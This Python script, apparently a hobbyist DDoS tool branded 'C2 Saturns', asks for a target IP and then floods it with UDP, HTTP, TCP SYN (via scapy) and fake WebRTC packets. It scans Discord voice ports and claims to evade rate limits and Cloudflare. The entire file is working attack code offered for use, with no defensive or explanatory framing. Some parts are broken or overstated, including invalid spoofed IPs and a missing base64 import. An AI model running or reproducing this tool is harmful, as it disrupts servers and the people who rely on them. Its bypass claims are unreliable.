import socket, threading, random, os, colorama, cloudscraper, requests, time
from scapy.all import *
from colorama import Fore

fake = ['192.165.6.6', '192.176.76.7', '192.156.6.6', '192.155.5.5', '192.143.2.2', '188.1421.41.4', '187.1222.12.1', '192.153.4.4', '192.154.32.4', '192.1535.53.25', '192.154.545.5', '192.143.43.4', '192.165.6.9', '188.1545.54.3']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36'
]

if os.name == "posix":
    os.system('clear')
elif os.name == "nt":
    os.system('cls')

logo = """
                                         _.oo.
                 _.u[[/;:,.         .odMMMMMM'
              .o888UU[[[/;:-.  .o@P^    MMM^
             oN88888UU[[[/;::-.        dP^
            dNMMNN888UU[[[/;:--.   .o@P^
           ,MMMMMMN888UU[[/;::-. o@^
           NNMMMNN888UU[[[/~.o@P^
           888888888UU[[[/o@^-..
          oI8888UU[[[/o@P^:--..
       .@^  YUU[[[/o@^;::---..
     oMP     ^/o@P^;:::---..
  .dMMM    .o@^ ^;::---...
 dMMMMMMM@^`       `^^^^
YMMMUP^
              C2 Saturns
                   V1
              MADE BY : BL3Z/PS7 hit again
"""
print(Fore.LIGHTMAGENTA_EX + logo)

try:
    ip = input(f"\033[1;37mIP Target : ")
    port = int(input("Port (leave 0 for auto Discord voice port scan): "))
    bytes = int(input("Bytes Per Sec : "))
    thrs = int(input("Thread : "))
    bost = input("Use Boost? Y/N : ")
    if os.name == "posix":
        os.system('clear')
    elif os.name == "nt":
        os.system('cls')
    if bost.lower() == 'y':
        bytes = bytes + 500
    print(Fore.LIGHTMAGENTA_EX + logo)
    print(Fore.LIGHTRED_EX + "Attacking...")
    print(Fore.LIGHTWHITE_EX + "ATTACK STATUS: ")
    print("╔═════════════════")
    print(f"║ IP    : {ip}   ")
    print(f"║ Port  : {port if port != 0 else 'Auto-scanning'} ")
    print(f"║ BPS   : {bytes}")
    print(f"║ Thrds : {thrs} ")
    print(f"║ Boost : {bost} ")
    print(f"║ Bot   : {bytes} ")
    print("╚═════════════════")

    def webrtc_bypass(ip, port, fk, ua_choice):
        """Simulate WebRTC traffic to bypass Cloudflare for Discord voice servers."""
        webrtc_headers = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {fk}\r\n"
            f"User-Agent: {ua_choice}\r\n"
            f"Accept: */*\r\n"
            f"Connection: keep-alive\r\n"
            f"Sec-WebSocket-Key: {base64.b64encode(os.urandom(16)).decode('utf-8')}\r\n"
            f"Sec-WebSocket-Version: 13\r\n"
            f"Upgrade: websocket\r\n"
            f"X-Discord-Client: discord-webrtc\r\n"
            f"\r\n"
        ).encode('utf-8')
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(webrtc_headers, (ip, port))
            s.sendto(os.urandom(65000), (ip, port))
        except:
            pass

    def scan_discord_ports(ip):
        """Scan common Discord voice server ports (50000-65535) to find active ones."""
        if port != 0:
            return [port]
        ports = []
        for p in range(50000, 65536, 1000):  # Step to reduce scan time
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(0.1)
                s.sendto(b"PROBE", (ip, p))
                s.recvfrom(1024)
                ports.append(p)
                s.close()
            except:
                s.close()
        return ports if ports else [random.randint(50000, 65535)]

    def c2():
        ports = scan_discord_ports(ip)
        for fk in fake:
            for target_port in ports:
                try:
                    # UDP Flood
                    s1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    byte = random._urandom(60000)
                    s1.sendto(byte, (ip, target_port))
                    for i in range(bytes):
                        s1.sendto(byte, (ip, target_port))
                        time.sleep(random.uniform(0.01, 0.1))  # Random delay to evade rate limits

                    # HTTP Flood with Cloudflare bypass
                    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s2.connect((ip, target_port))
                    s2.send(f"GET / HTTP/1.1\r\nHost: {fk}\r\nUser-Agent: {random.choice(ua)}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nConnection: Keep-Alive\r\n\r\n".encode("utf-8"))
                    s2.send(byte)

                    # WebRTC Bypass
                    webrtc_bypass(ip, target_port, fk, random.choice(ua))

                    # TCP SYN Flood
                    fuck = IP(dst=ip)
                    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
                    raw = Raw(b"X"*60000)
                    p = fuck / tcp / raw
                    send(p, loop=bytes, verbose=0)

                    # Cloudscraper HTTP Request
                    scraper = cloudscraper.create_scraper(disableCloudflareV1=True)
                    scraper.get(ip, timeout=thrs, headers={'Host': fk, 'User-Agent': random.choice(ua)})

                except socket.gaierror:
                    print(Fore.LIGHTRED_EX + "[!] Fail get target info, did you type the target correct? [!]")
                    exit()
                except TimeoutError:
                    print(Fore.LIGHTRED_EX + "TARGET IS DOWN!")
                except:
                    print(Fore.LIGHTMAGENTA_EX + "[ C2 ] INFO : SUCCESSFULLY FLOODING TARGET <3 [ C2 ]")

    for i in range(thrs):
        threads = threading.Thread(target=c2)
        threads.start()

except ValueError:
    print("\033[1;33mDid you fill the target info correctly? please retry!")
